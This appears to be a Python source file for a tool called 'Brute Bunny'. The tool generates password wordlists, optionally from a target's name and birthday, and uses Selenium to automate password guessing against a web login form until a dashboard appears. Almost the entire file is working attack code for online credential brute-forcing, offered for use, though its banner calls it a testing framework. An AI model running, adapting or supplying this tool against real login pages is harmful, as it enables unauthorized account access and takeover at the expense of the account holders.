import os
import sys
import argparse
import itertools
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from time import sleep
from colorama import Fore, init
from pyfiglet import Figlet

# Initialize colorama for colored terminal output
init(autoreset=True)

# ASCII art for aesthetics
def display_banner():
    fig = Figlet(font="slant")
    print(Fore.MAGENTA + fig.renderText("Brute Bunny"))
    print(Fore.CYAN + "   --- Welcome to Brute Bunny Tool ---")
    print(Fore.CYAN + "   Personalized, Fast, and Secure Testing Framework")
    print(Fore.CYAN + "-" * 50 + "\n")


# Function to generate intelligent wordlists
def generate_wordlist():
    print(Fore.GREEN + "   --- Intelligent Wordlist Generator ---")
    print(Fore.CYAN + "   Fast, Flexible, and Customizable")
    print(Fore.CYAN + "-" * 50 + "\n")

    print(Fore.CYAN + "G 0 B L ! N \033[32m2.0\033[m | WORDLIST GENERATOR")
    print(Fore.CYAN + "~ by: Bugs-bunny")
    print('-' * 50 + '\n')

    # Get parameters for wordlist size
    scale = input(Fore.CYAN + '[!] Provide a size scale [eg: "1 to 8" = 1:8] : ')
    start = int(scale.split(':')[0])
    final = int(scale.split(':')[1])

    # Personal data for customization
    use_personal = input(Fore.CYAN + "[?] Do you want to enter personal data? [y/N]: ")
    if use_personal.lower() == 'y':
        first_name = input(Fore.CYAN + "[*] First Name: ")
        last_name = input(Fore.CYAN + "[*] Last Name: ")
        birthday = input(Fore.CYAN + "[*] Birthday: ")
        month = input(Fore.CYAN + "[*] Month: ")
        year = input(Fore.CYAN + "[*] Year: ")
        chrs = first_name + last_name + birthday + month + year
    else:
        chrs = 'abcdefghijklmnopqrstuvwxyz'

    # Add additional characters
    uppercase_characters = chrs.upper()
    special_characters = r'!\\][/?.,~-=";:><@#$%&*()_+\' '  # Fixed invalid escape sequence
    numeric_characters = '1234567890'

    # Wordlist file setup
    file_name = input(Fore.CYAN + "[!] Insert a name for your wordlist file: ")
    arq = open(file_name, 'w')
    if input(Fore.CYAN + "[?] Do you want to use uppercase characters? (y/n): ").lower() == 'y':
        chrs += uppercase_characters
    if input(Fore.CYAN + "[?] Do you want to use special characters? (y/n): ").lower() == 'y':
        chrs += special_characters
    if input(Fore.CYAN + "[?] Do you want to use numeric characters? (y/n): ").lower() == 'y':
        chrs += numeric_characters

    # Generate wordlist
    for i in range(start, final + 1):
        for j in itertools.product(chrs, repeat=i):
            temp = ''.join(j)
            print(temp)
            arq.write(temp + '\n')

    arq.close()
    print(Fore.GREEN + f"[+] Wordlist '{file_name}' generated successfully!")


# Function to perform brute force attack
def brute_force_login(url, username, passwords):
    print(Fore.CYAN + f"[*] Starting brute force on {url}...")
    print(Fore.CYAN + f"[*] Username: {username}")
    print(Fore.CYAN + f"[*] Loaded {len(passwords)} passwords from the wordlist.\n")

    # Selenium setup
    chrome_options = Options()
    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
    chrome_driver_path = "C:\\Users\\devbu\\OneDrive\\Desktop\\Brute-force\\chromedriver-win64\\chromedriver.exe"
    service = Service(chrome_driver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    # Open the login page
    driver.get(url)
    sleep(3)  # Allow time for the page to load

    # Locate username and password fields
    try:
        username_field = driver.find_element(By.NAME, "email")  # Replace with the correct field name
        password_field = driver.find_element(By.NAME, "password")  # Replace with the correct field name
    except Exception as e:
        print(Fore.RED + f"[!] Error locating fields: {e}")
        driver.quit()
        sys.exit(1)

    # Enter username once
    username_field.clear()
    username_field.send_keys(username)
    sleep(1)

    # Iterate over passwords
    for index, password in enumerate(passwords, start=1):
        try:
            print(Fore.MAGENTA + f"[*] Trying password: {password} (Attempt {index})")

            # Clear password field and input new password
            password_field.send_keys(Keys.CONTROL + "a")
            password_field.send_keys(Keys.DELETE)
            sleep(0.5)

            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)
            sleep(2)

            # Check for success
            if "Dashboard" in driver.title or "Welcome" in driver.page_source:
                print(Fore.GREEN + f"[+] Password found: {password}")
                driver.quit()
                return True

            print(Fore.RED + "[-] Incorrect password.")

        except Exception as e:
            print(Fore.RED + f"[!] Error during attempt: {e}")

    driver.quit()
    print(Fore.RED + "[!] Brute force failed: No valid password found.")
    return False


# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Brute Bunny Tool - A Personalized Brute Force and Wordlist Generator Framework",
        epilog="Example: python script.py --url https://example.com/login --username testuser --passwords wordlist.txt"
    )

    # Command-line options
    parser.add_argument(
        "--url", required=False, default="https://example.com/login",
        help="The URL of the login page to test (e.g., https://example.com/login)"
    )
    parser.add_argument(
        "--username", required=False, default="testuser",
        help="The username to test on the login page"
    )
    parser.add_argument(
        "--passwords", required=False, default="passwords.txt",
        help="The path to the password wordlist file"
    )
    parser.add_argument(
        "--generate", action='store_true', help="Generate a new wordlist"
    )

    return parser.parse_args()


# Main function
def main():
    # Parse command-line arguments
    args = parse_arguments()

    # Display banner
    display_banner()

    # Option to generate wordlist
    if args.generate:
        generate_wordlist()
    else:
        # Load passwords
        try:
            with open(args.passwords, "r") as file:
                passwords = [line.strip() for line in file]
        except Exception as e:
            print(Fore.RED + f"[!] Error loading wordlist: {e}")
            sys.exit(1)

        # Start brute force attack
        brute_force_login(args.url, args.username, passwords)


if __name__ == "__main__":
    main()
